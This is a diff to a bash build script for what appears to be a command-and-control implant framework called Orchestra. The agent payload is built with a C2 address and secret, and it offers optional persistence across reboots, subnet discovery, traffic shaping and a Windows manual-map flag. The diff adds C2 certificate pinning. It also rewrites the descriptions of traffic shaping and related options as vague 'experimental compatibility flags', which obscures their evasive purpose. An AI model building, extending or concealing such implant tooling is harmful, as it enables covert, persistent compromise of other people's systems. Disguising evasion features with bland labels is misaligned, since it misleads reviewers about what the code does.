@@ -145,8 +145,10 @@ cat <<EOF
 Optional Cargo features (off by default; enable per-deployment as needed):
   persistence            — re-launch agent across reboots (systemd / launchd / scheduled task)
   network-discovery      — passive subnet enumeration for inventory
-  perf-optimize          — CPU-microarch-aware tuning
-  traffic-normalization  — packet timing/size normalisation for QoS-strict networks
+    env-validation         — startup environment policy checks
+    perf-optimize          — experimental optimizer compatibility flag
+    traffic-normalization  — experimental transport-shaping compatibility flag
+    manual-map             — experimental Windows manual-map compile flag
 EOF
 prompt EXTRA_FEAT "Comma-separated extras to enable (Enter for none)" ""
 if [[ -n "$EXTRA_FEAT" ]]; then
@@ -155,6 +157,10 @@ if [[ -n "$EXTRA_FEAT" ]]; then
         f="${f// /}"
         [[ -n "$f" ]] && FEATURES+=("$f")
     done
+fi
+if [[ "$DEPLOY" != "outbound" && ${#FEATURES[@]} -gt 0 ]]; then
+    warn "agent Cargo features require a self-contained outbound build in the current builder pipeline; ignoring extras for launcher mode"
+    FEATURES=()
 fi
 say "Features: ${FEATURES[*]:-<none>}"
 
@@ -200,6 +206,18 @@ if [[ ! -f "$CERT" || ! -f "$KEY" ]]; then
     ok "TLS material: $CERT / $KEY"
 fi
 
+cert_fingerprint() {
+    if command -v sha256sum >/dev/null 2>&1; then
+        openssl x509 -in "$1" -outform DER | sha256sum | awk '{print $1}'
+    else
+        openssl x509 -in "$1" -outform DER | shasum -a 256 | awk '{print $1}'
+    fi
+}
+CERT_FP=$(cert_fingerprint "$CERT")
+grep -q '^SERVER_CERT_FINGERPRINT=' "$CRED_FILE" 2>/dev/null || \
+    echo "SERVER_CERT_FINGERPRINT=${CERT_FP}" >> "$CRED_FILE"
+ok "server certificate SHA-256 fingerprint: $CERT_FP"
+
 # -------- 8. write profile + server config ---------------------------------
 
 # Build features TOML array literal.
@@ -227,6 +245,7 @@ fi
     echo "encryption_key    = \"${AES_KEY}\""
     if [[ "$DEPLOY" == "outbound" ]]; then
         echo "c_server_secret   = \"${AGENT_SECRET}\""
+        echo "server_cert_fingerprint = \"${CERT_FP}\""
     fi
     echo "features          = ${feat_toml}"
     echo "package           = \"${PACKAGE}\""
@@ -288,7 +307,7 @@ build_payload_with_zig() {
 
     local extra_env=()
     if [[ "$DEPLOY" == "outbound" ]]; then
-        extra_env+=(ORCHESTRA_C_ADDR="$C2_ADDR" ORCHESTRA_C_SECRET="$AGENT_SECRET")
+        extra_env+=(ORCHESTRA_C_ADDR="$C2_ADDR" ORCHESTRA_C_SECRET="$AGENT_SECRET" ORCHESTRA_C_CERT_FP="$CERT_FP")
     fi
     local feat_args=()
     if [[ ${#FEATURES[@]} -gt 0 ]]; then
